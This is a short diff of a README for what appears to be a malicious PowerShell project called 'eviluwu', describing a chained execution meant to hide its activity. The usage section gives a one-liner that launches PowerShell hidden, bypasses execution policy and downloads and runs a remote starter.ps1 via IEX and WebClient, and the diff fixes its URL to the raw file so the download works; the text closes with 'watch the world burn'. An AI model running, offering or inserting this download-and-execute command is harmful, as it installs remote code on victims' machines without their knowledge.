@@ -15,7 +15,7 @@ The execution flow involves four main components chaining together to hide execu
 ## Usage
 1. run the starter.ps1 (doesn't have to be ps1, it's a one-liner!)
 1. (alternatively) You can run 
-`powershell -w h -nop -ExecutionPolicy Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://github.com/b3at1/eviluwu/blob/main/starter.ps1')"` 
+`powershell -w h -nop -ExecutionPolicy Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/starter.ps1')"` 
 which is short enough to execute in the run dialogue.
 2. timuwue to watch the wouwurld burn!
 ### 1. `starter.ps1`
